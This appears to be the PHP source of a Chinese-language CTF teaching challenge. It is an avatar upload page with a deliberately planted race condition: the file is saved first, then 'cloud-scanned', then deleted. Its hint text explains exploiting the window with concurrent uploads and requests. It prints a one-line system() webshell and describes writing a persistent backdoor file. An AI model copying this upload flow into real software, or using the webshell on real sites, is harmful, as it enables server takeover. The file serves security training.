<?php
declare(strict_types=1);
/* ------------------------------------------------------------------
 * upload6 条件竞争（先落盘后删除：move_uploaded_file 与 unlink 之间的时间窗）
 * 教学靶场 · 仅用于授权学习环境
 * ------------------------------------------------------------------ */

$META = json_decode(file_get_contents(__DIR__ . '/meta.json'), true);

$BAD = '/system|eval|assert|passthru|exec|shell_exec|file_put_contents|file_get_contents|`/i';

$msg = ''; $err = '';
if (isset($_FILES['avatar'])) {
    $orig = basename((string)$_FILES['avatar']['name']);
    $dst  = __DIR__ . '/uploads/' . $orig;

    // 安全流程：先保存 → 云查杀 → 恶意则删除
    if (move_uploaded_file($_FILES['avatar']['tmp_name'], $dst)) {
        // “云查杀引擎”需要网络往返（80~200ms）——文件此刻已经真实存在！
        usleep(random_int(80000, 200000));
        $content = (string)file_get_contents($dst);
        if (preg_match($BAD, $content)) {
            unlink($dst);                       // ← 删除发生在"稍后"，这就是攻击窗口
            $err = '云查杀：检测到恶意代码，已删除 ' . htmlspecialchars($orig);
        } else {
            $msg = "上传成功：uploads/" . htmlspecialchars($orig);
        }
    } else {
        $err = '上传失败（文件为空或目录不可写？）';
    }
}

// 展示已上传文件（方便看到自己传了什么）
$files = array_values(array_diff(scandir(__DIR__ . '/uploads') ?: [], ['.', '..', '.gitkeep']));
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars($META['title']) ?> · <?= htmlspecialchars($META['id']) ?></title>
<style>
:root{--bg:#0d1117;--card:#161b22;--bd:#30363d;--fg:#c9d1d9;--dim:#8b949e;--acc:#58a6ff;--ok:#3fb950;--warn:#d29922;--err:#f85149;--mono:ui-monospace,SFMono-Regular,Consolas,monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:15px/1.7 "Segoe UI","Microsoft YaHei",sans-serif;padding:0 0 60px}
.wrap{max-width:900px;margin:0 auto;padding:0 20px}
header{border-bottom:1px solid var(--bd);background:linear-gradient(180deg,#161b22,#0d1117);padding:28px 0 20px;margin-bottom:24px}
h1{font-size:24px;margin:8px 0 4px}
.badge{display:inline-block;font-size:12px;padding:2px 10px;border:1px solid var(--bd);border-radius:12px;color:var(--acc);margin-right:6px}
.badge.diff-easy{color:var(--ok)} .badge.diff-medium{color:var(--warn)} .badge.diff-hard{color:var(--err)}
.sub{color:var(--dim);font-size:13px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:8px;padding:18px 20px;margin-bottom:18px}
.card h2{font-size:16px;color:var(--acc);margin-bottom:10px;border-left:3px solid var(--acc);padding-left:8px}
.card p{margin-bottom:8px}
code,.mono{font-family:var(--mono);background:#0b0f14;border:1px solid var(--bd);border-radius:4px;padding:1px 6px;font-size:13px;color:#79c0ff}
pre{background:#0b0f14;border:1px solid var(--bd);border-radius:6px;padding:12px;overflow:auto;font-family:var(--mono);font-size:13px;margin:8px 0;color:#a5d6ff}
details{border:1px solid var(--bd);border-radius:6px;padding:10px 14px;margin:8px 0;background:#10151c}
summary{cursor:pointer;color:var(--warn);font-size:14px;user-select:none}
details[open] summary{border-bottom:1px dashed var(--bd);padding-bottom:6px;margin-bottom:8px}
.hint-lv{color:var(--dim);font-size:12px}
input[type=text],input[type=file]{background:#0b0f14;border:1px solid var(--bd);color:var(--fg);border-radius:6px;padding:8px 12px;font-size:14px}
button{background:#21262d;border:1px solid var(--bd);color:var(--fg);border-radius:6px;padding:8px 18px;cursor:pointer;font-size:14px}
button:hover{border-color:var(--acc);color:var(--acc)}
#flagResult{margin-top:10px;font-size:14px;min-height:22px}
.ok{color:var(--ok)} .bad{color:var(--err)}
footer{border-top:1px solid var(--bd);margin-top:30px;padding-top:16px;color:var(--dim);font-size:13px;display:flex;justify-content:space-between}
footer a{color:var(--dim);text-decoration:none} footer a:hover{color:var(--acc)}
.form-row{margin:8px 0;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.filelist{font-family:var(--mono);font-size:13px;color:var(--dim)}
.filelist a{color:#79c0ff;text-decoration:none}
</style>
</head>
<body>
<header><div class="wrap">
  <div><span class="badge"><?= htmlspecialchars($META['category']) ?></span><span class="badge diff-<?= htmlspecialchars($META['difficulty']) ?>">难度: <?= htmlspecialchars($META['difficulty']) ?></span></div>
  <h1><?= htmlspecialchars($META['title']) ?> <span style="color:var(--dim);font-size:14px;font-weight:400"><?= htmlspecialchars($META['id']) ?></span></h1>
  <div class="sub">CTF Web 全题型教学式靶场 · 本题仅用于授权安全学习</div>
</div></header>

<div class="wrap">

<div class="card">
  <h2>题目描述</h2>
  <p>这次的方案听上去无懈可击：<b>先保存、再“云查杀”、查到恶意代码就删</b>。PHP 脚本上传后活不过 0.2 秒——删得这么快，能出什么事？</p>
  <p>但"先保存"和"后删除"之间存在一个<b>真实存在的时间窗</b>（本题约 80~200ms）：只要在窗口内<b>抢先访问</b>那个文件，它就执行了。一次不行就一千次——多线程并发地"边传边访问"。</p>
  <p>flag 在本题目录的 <code>flag.php</code> 里（PHP 注释里，直接访问什么都看不到）。</p>
</div>

<div class="card">
  <h2>知识点充电站</h2>
  <p><b>条件竞争（Race Condition）</b>：检查与使用之间存在时间差（TOCTOU：Time Of Check To Time Of Use），并发请求让"非法状态"在窗口内被利用。</p>
  <pre>线程组 A（不停上传）：POST shell.php → 文件短暂存在于 uploads/
线程组 B（不停访问）：GET  uploads/shell.php?... → 命中窗口即执行</pre>
  <p>两种经典 payload：</p>
  <pre>① 命中即赢：shell 内容直接读 flag —— GET shell.php?f=../flag.php
② 命中留后门（更稳）：shell 内容执行 file_put_contents 把 flag/新 shell
   写到一个【不会被删除】的新文件里，之后随时慢慢访问</pre>
  <p>真实世界同款漏洞：先创建临时文件再改名、先写配置再校验、"删除测试订单"等逻辑比比皆是（著名案例：Intranet 文件柜、各种"先注册再审核"流程）。</p>
  <p>getshell 后读 flag 的姿势（flag.php 内容形如 <code>&lt;?php //flag{...} ?&gt;</code>，直接访问输出空白）：</p>
  <pre>上传 shell.php 内容：&lt;?php system($_GET['c']); ?&gt;
访问：/upload1/uploads/shell.php?c=cat%20../flag.php      # 读源码即得 flag</pre>
</div>

<div class="card">
  <h2>头像上传</h2>
  <form method="POST" enctype="multipart/form-data" class="form-row">
    <input type="file" name="avatar" id="f" required>
    <button type="submit">上传</button>
  </form>
  <?php if ($msg): ?><p class="ok"><?= $msg ?></p><?php endif; ?>
  <?php if ($err): ?><p class="bad"><?= $err ?></p><?php endif; ?>
  <p class="sub">已上传文件：</p>
  <p class="filelist">
    <?php if (!$files): ?>（空）<?php else: foreach ($files as $f): ?>
      <a href="uploads/<?= rawurlencode($f) ?>"><?= htmlspecialchars($f) ?></a>&nbsp;&nbsp;
    <?php endforeach; endif; ?>
  </p>

</div>

<div class="card">
  <h2>渐进提示（先自己想，再一层层打开）</h2>
  <?php foreach ($META['hints'] as $i => $h): ?>
  <details><summary>提示 <?= $i + 1 ?> <span class="hint-lv">（第 <?= $i + 1 ?>/<?= count($META['hints']) ?> 层）</span></summary>
    <p><?= nl2br(htmlspecialchars($h)) ?></p>
  </details>
  <?php endforeach; ?>
</div>

<div class="card">
  <h2>提交 Flag</h2>
  <div class="form-row">
    <input type="text" id="flagInput" placeholder="flag{upload1_xxxxxxxx}">
    <button onclick="submitFlag()">提交</button>
  </div>
  <div id="flagResult"></div>
</div>

<footer class="wrap">
  <span><?php if ($META['prev']): ?><a href="/<?= htmlspecialchars($META['prev']) ?>">← 上一题 <?= htmlspecialchars($META['prev']) ?></a><?php endif; ?></span>
  <span>难度递进 · 教学式靶场</span>
  <span><?php if ($META['next']): ?><a href="/<?= htmlspecialchars($META['next']) ?>">下一题 <?= htmlspecialchars($META['next']) ?> →</a><?php endif; ?></span>
</footer>
</div>

<script>
async function submitFlag(){
  const box = document.getElementById('flagResult');
  const flag = document.getElementById('flagInput').value.trim();
  if(!flag) { box.textContent = '请输入 flag'; box.className='bad'; return; }
  box.textContent = '校验中...'; box.className='';
  try{
    const r = await fetch('/api/verify', {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body: 'challenge_id=<?= urlencode($META['id']) ?>&flag=' + encodeURIComponent(flag)
    });
    const t = await r.text();
    let msg = t; try{ const j = JSON.parse(t); msg = j.message || j.msg || (j.correct!==undefined ? (j.correct?'正确 ✓':'错误 ✗') : t); }catch(e){}
    box.textContent = msg; box.className = /正确|correct|true|✓/.test(String(msg)) ? 'ok' : 'bad';
  }catch(e){
    box.textContent = '无法连接校验接口 /api/verify（本地预览属正常，联调后可用）';
    box.className = 'bad';
  }
}
</script>
</body>
</html>
